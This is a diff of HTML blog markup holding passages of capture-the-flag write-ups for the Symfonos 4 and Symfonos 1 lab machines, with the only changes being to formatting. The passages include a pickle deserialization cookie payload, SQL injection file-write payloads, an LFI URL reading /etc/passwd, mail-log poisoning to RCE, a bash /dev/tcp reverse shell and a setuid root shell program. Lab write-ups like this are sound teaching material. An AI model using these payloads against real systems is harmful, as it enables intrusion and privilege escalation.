+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="http-80">HTTP (80)&lt;/h2>
 &lt;p>On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
 and files.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-26.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Performing a bruteforce with ffuf we get a &lt;strong>gods&lt;/strong> directory.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style="color:#ae81ff">403&lt;/span> | tee root.ffuf
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style="color:#ae81ff">403&lt;/span> | tee root.ffuf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>In this directory we only have some files, with nothing useful in them.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -313,16 +334,18 @@ path to privesc.&lt;/p>
 &lt;p>Based on the use of pickle, we need to exploit deserialization through the cookie.&lt;/p>
 &lt;p>I came up with the below script to generate a base64 encoded cookie which when deserialized
 will create a setuid binary of bash.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> jsonpickle
-&lt;span style="color:#f92672">import&lt;/span> base64
-&lt;span style="color:#f92672">import&lt;/span> os
-&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RCE&lt;/span>(object):
-&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">__reduce__&lt;/span>(self):
-cmd &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span>)
-&lt;span style="color:#66d9ef">return&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>system, (cmd,)
-encoded &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(jsonpickle&lt;span style="color:#f92672">.&lt;/span>encode(RCE()))
-&lt;span style="color:#66d9ef">print&lt;/span>(encoded)
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> jsonpickle
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RCE&lt;/span>(object):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">__reduce__&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cmd &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>system, (cmd,)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>encoded &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(jsonpickle&lt;span style="color:#f92672">.&lt;/span>encode(RCE()))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(encoded)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-22.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Setting the cookie and sending the request using burpsuite:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-23.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -341,14 +364,14 @@ the &lt;code>$_SESSION['logged_in']&lt;/code> is set to false.&lt;/p>
 &lt;p>This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file
 and exploit this with sqlmap.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-28.png" alt="symfonos" class="center" style="border-radius: 8px;" />
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sqlmap -r atlantis.req --batch --dump --level&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> --risk&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> --threads&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sqlmap -r atlantis.req --batch --dump --level&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> --risk&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> --threads&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
 I tried this but couldn&amp;rsquo;t figure out why it failed but on revisiting it afterwards I figured out the issue.&lt;/p>
 &lt;p>Using this payload in my post request to write to a file using select, we don&amp;rsquo;t get the usual redirect that
 signifies that the query was successful.&lt;/p>
-&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'2' INTO OUTFILE '/tmp/test.log'-- -&amp;amp;password=a
+&lt;pre tabindex="0">&lt;code>username=admin&amp;#39; and 1=2 Union Select 1,&amp;#39;2&amp;#39; INTO OUTFILE &amp;#39;/tmp/test.log&amp;#39;-- -&amp;amp;password=a
 &lt;/code>&lt;/pre>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-29.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>The file is actually written to disk if we check the /tmp folder.&lt;/p>
@@ -366,7 +389,7 @@ we need folders that the mysql user can write. I discovered /var/lib/mysql and /
 &lt;p>Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to
 what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-existent file.&lt;/p>
 &lt;p>Testing this using /var/lib/mysql the file gets written.&lt;/p>
-&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'test' INTO OUTFILE '/var/lib/mysql/123456.log'-- -&amp;amp;password=a
+&lt;pre tabindex="0">&lt;code>username=admin&amp;#39; and 1=2 Union Select 1,&amp;#39;test&amp;#39; INTO OUTFILE &amp;#39;/var/lib/mysql/123456.log&amp;#39;-- -&amp;amp;password=a
 &lt;/code>&lt;/pre>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-33.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Then accessing it using the lfi works this time.&lt;/p>
@@ -396,7 +419,7 @@ escalation we exploit a setuid binary that doesn&amp;rsquo;t use absolute paths,
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>I already have the IP of the box.&lt;/p>
 &lt;p>Nmap output:&lt;/p>
-&lt;pre>&lt;code>Nmap scan report for 192.168.191.128
+&lt;pre tabindex="0">&lt;code>Nmap scan report for 192.168.191.128
 Host is up (0.00025s latency).
 PORT STATE SERVICE VERSION
 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
@@ -413,7 +436,7 @@ PORT STATE SERVICE VERSION
 |_ssl-date: TLS randomness does not represent time
 80/tcp open http Apache httpd 2.4.25 ((Debian))
 |_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: Site doesn&amp;#39;t have a title (text/html).
 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
 Service Info: Hosts: symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
@@ -441,14 +464,14 @@ Host script results:
 &lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="samba-139445">Samba (139/445)&lt;/h2>
 &lt;p>Using enum4linux-ng we get 2 pieces of useful information.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">enum4linux-ng.py -A 192.168.191.128:
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>A user &lt;strong>helios&lt;/strong> is discovered&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>enum4linux-ng.py -A 192.168.191.128:
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>A user &lt;strong>helios&lt;/strong> is discovered&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos2.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;p>and the &lt;strong>anonymous&lt;/strong> share is accessible without credentials.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos3.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;p>Using smbclient to access the share, there is a txt file.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.128&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.128&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos4.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;p>Looking at the contents of attention.txt:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos5.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
@@ -462,8 +485,8 @@ the helios share.&lt;/p>
 &lt;p>When we access the endpoint we end up on a wordpress instance.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos8.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;p>After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token &lt;span style="color:#f92672">[&lt;/span>redacted&lt;span style="color:#f92672">]&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token &lt;span style="color:#f92672">[&lt;/span>redacted&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
 &lt;li>mail-masta 1.0:&lt;/li>
 &lt;/ol>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos9.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
@@ -471,10 +494,11 @@ the helios share.&lt;/p>
 &lt;li>site-editor 1.1.1&lt;/li>
 &lt;/ol>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos10.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
-&lt;p>Using the PoC available on exploitdb: &lt;a href="https://www.exploit-db.com/exploits/40290/">https://www.exploit-db.com/exploits/40290/&lt;/a> , we can craft this url
+&lt;p>Using the PoC available on exploitdb: &lt;a href="https://www.exploit-db.com/exploits/40290/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40290/&lt;/a>
+, we can craft this url
 to read files such as /etc/passwd:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl&lt;span style="color:#f92672">=&lt;/span>/etc/passwd
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl&lt;span style="color:#f92672">=&lt;/span>/etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos11.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;h1 id="getting-shell-as-helios---lfi-to-rce">Getting shell as helios - LFI to RCE&lt;/h1>
 &lt;p>A typical method to escalate to RCE using LFI is poisoning log files but I wasn&amp;rsquo;t able to load any log
@@ -483,15 +507,15 @@ With the presence of port 25 we can try sending an email and try accessing the e
 &lt;p>Sending email with payload:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos12.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;p>Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.&lt;/p>
-&lt;pre>&lt;code class="language-url" data-lang="url">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=whoami
+&lt;pre tabindex="0">&lt;code class="language-url" data-lang="url">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=whoami
 &lt;/code>&lt;/pre>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos13.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;p>Now we can get a reverse shell using this payload:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">/bin/bash -c &lt;span style="color:#e6db74">&amp;#34;/bin/bash -i &amp;gt;%26 /dev/tcp/192.168.191.1/9000 0&amp;gt;%261 %26&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>/bin/bash -c &lt;span style="color:#e6db74">&amp;#34;/bin/bash -i &amp;gt;%26 /dev/tcp/192.168.191.1/9000 0&amp;gt;%261 %26&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
 &lt;p>Usual enumeration for privilege escalation involves looking for suid binaries by using find.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">find / -perm -4000 2&amp;gt;/dev/null
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>The binary statuscheck isn&amp;rsquo;t among the linux default ones.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>find / -perm -4000 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The binary statuscheck isn&amp;rsquo;t among the linux default ones.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos14.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;p>After running it and then running strings against it, it calls the curl command when executed.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos15.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
@@ -503,15 +527,15 @@ curl command.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos17.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;h1 id="extras">Extras&lt;/h1>
 &lt;p>Better way to handle the sending email part using sendEmail:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &lt;span style="color:#e6db74">&amp;#34;Test Subject&amp;#34;&lt;/span> -m &lt;span style="color:#e6db74">&amp;#34;Test Message&amp;#34;&lt;/span> -o tls&lt;span style="color:#f92672">=&lt;/span>no
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Better suid exploit, compiling a c program that correctly sets the uid and gid as root.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span>&lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
-setgid(&lt;span style="color:#ae81ff">0&lt;/span>);
-setuid(&lt;span style="color:#ae81ff">0&lt;/span>);
-execl(&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
-}
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &lt;span style="color:#e6db74">&amp;#34;Test Subject&amp;#34;&lt;/span> -m &lt;span style="color:#e6db74">&amp;#34;Test Message&amp;#34;&lt;/span> -o tls&lt;span style="color:#f92672">=&lt;/span>no
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Better suid exploit, compiling a c program that correctly sets the uid and gid as root.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span>&lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">setgid&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">setuid&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">execl&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos18.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
 &lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
 &lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
